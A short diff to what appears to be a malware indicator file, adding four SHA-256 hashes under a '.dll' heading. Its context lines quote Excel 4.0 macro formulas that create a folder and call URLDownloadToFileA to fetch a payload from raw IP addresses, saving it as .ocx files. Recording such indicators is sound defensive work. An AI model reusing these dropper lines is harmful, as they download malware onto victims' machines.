@@ -7,6 +7,15 @@
 
 ******************************
 
+.dll
+
+b09754e9577d21d16f9323a399fe8cde1e51482defdc2901bbf2763d2ae58e31
+65d1b723f439a40ed0f0ff8d1ea949313fb49855f09b3c38805f2e49a073b652
+9fcca1709802bdb90266eaa7b18111cac550c8393da019495251e338a5455fdb
+e269497ce458b21c8427b3f6f6594a25d583490930af2d3395cb013b20d08ff7
+
+******************************
+
 =CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\a", 0)
 =CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://66.70.218.62/8494228.dat", "C:\a\Gertiokas1.ocx")
 =CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://79.141.171.33/8494228.dat", "C:\a\Gertiokas2.ocx")
